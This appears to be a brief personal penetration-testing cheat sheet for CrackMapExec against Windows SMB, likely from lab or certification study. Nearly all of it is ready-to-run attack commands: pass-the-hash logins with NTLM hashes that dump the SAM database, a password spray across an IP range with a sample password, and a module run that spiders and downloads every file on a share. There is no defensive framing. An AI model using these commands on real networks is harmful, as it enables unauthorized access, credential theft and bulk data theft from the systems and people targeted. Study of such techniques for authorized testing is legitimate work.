#tool #recon #pth 


https://wiki.porchetta.industries/smb-protocol/enumeration/enumerate-null-sessions

🔴 if it shows 'Pwn3d!' that means user has local admin privilege in the machine
#### Pass the hash 

```bash
cme smb 192.168.206.211 -u Administrator -H 7a38310ea6f0027ee955abed1762964b --sam
```

```bash
cme smb 192.168.188.222 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:8f518eb35353d7a83d27e7fe457664e5
```


#### Password Spray IP range

```bash
cme smb 192.168.50.70-76 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

### Dump all files

```bash
cme smb 192.168.216.248/transfer -u 'steven' -p 'fireball' -M spider_plus -o READ_ONLY=false
```

